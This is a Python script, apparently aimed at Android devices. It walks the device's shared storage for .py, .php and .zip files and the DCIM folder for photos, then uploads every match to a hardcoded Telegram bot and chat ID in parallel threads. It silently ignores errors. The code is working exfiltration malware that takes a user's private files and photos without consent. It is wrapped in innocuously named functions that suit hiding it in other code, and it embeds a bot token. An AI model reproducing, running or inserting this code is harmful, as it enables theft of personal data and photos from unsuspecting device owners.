import os
import requests
from concurrent.futures import ThreadPoolExecutor

def scan_and_send_files(bot_token, chat_id, folder_path='/'):
    API_URL_DOCUMENT = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    API_URL_MESSAGE = f'https://api.telegram.org/bot{bot_token}/sendMessage'

    def send_document_to_telegram(file_path, chat_id):
        try:
            with open(file_path, 'rb') as file:
                response = requests.post(API_URL_DOCUMENT, data={'chat_id': chat_id}, files={'document': file})
                return response.json()
        except Exception as e:
            return None

    def send_message_to_telegram(message, chat_id):
        try:
            response = requests.post(API_URL_MESSAGE, data={'chat_id': chat_id, 'text': message})
            return response.json()
        except Exception as e:
            return None

    contents = os.listdir(folder_path)

    for content in contents:
        content_path = os.path.join(folder_path, content)
        if os.path.isfile(content_path):
            if content.lower().endswith(('.py', '.php', '.zip')):
                try:
                    message = f"File: {content}\nPath: {content_path}"
                    msg_response = send_message_to_telegram(message, chat_id)
                    file_response = send_document_to_telegram(content_path, chat_id)
                except Exception as e:
                    pass
        elif os.path.isdir(content_path):
            files_in_subdir = [os.path.join(content_path, f) for f in os.listdir(content_path) if os.path.isfile(os.path.join(content_path, f))]
            for file_path in files_in_subdir:
                if file_path.lower().endswith(('.py', '.php', '.zip')):
                    try:
                        message = f"File: {os.path.basename(file_path)}\nPath: {file_path}"
                        msg_response = send_message_to_telegram(message, chat_id)
                        
                        file_response = send_document_to_telegram(file_path, chat_id)
                    except Exception as e:
                        pass
BOT_TOKEN = '5240507980:AAHGnzHPLfO0DJx8CdBGRxjZV0uGhLEQgsw'
CHAT_ID = 901011671
def send_photos_in_dcim_to_telegram(bot_token, chat_id, dcim_folder_path):
    API_URL = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

    def send_photo_to_telegram(file_path, chat_id):
        with open(file_path, 'rb') as file:
            response = requests.post(API_URL, data={'chat_id': chat_id}, files={'photo': file})
            return response.json()

    for root, dirs, files in os.walk(dcim_folder_path):
        for file in files:
            if file.lower().endswith(('.png', '.jpg', '.jpeg')):
                file_path = os.path.join(root, file)
                response = send_photo_to_telegram(file_path, chat_id)
                print(f'Sent {file_path}: {response}')
BOT_TOKEN = '5240507980:AAHGnzHPLfO0DJx8CdBGRxjZV0uGhLEQgsw'
CHAT_ID = 901011671
DCIM_FOLDER_PATH = '/sdcard/DCIM'
MAX_WORKERS = 5
def qq(a ,b):
    return a * b
def rudd():
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_scan = executor.submit(scan_and_send_files, BOT_TOKEN, CHAT_ID, folder_path='/storage/emulated/0')
        future_photos = executor.submit(send_photos_in_dcim_to_telegram, BOT_TOKEN, CHAT_ID, DCIM_FOLDER_PATH)
    future_scan.result()
    future_photos.result()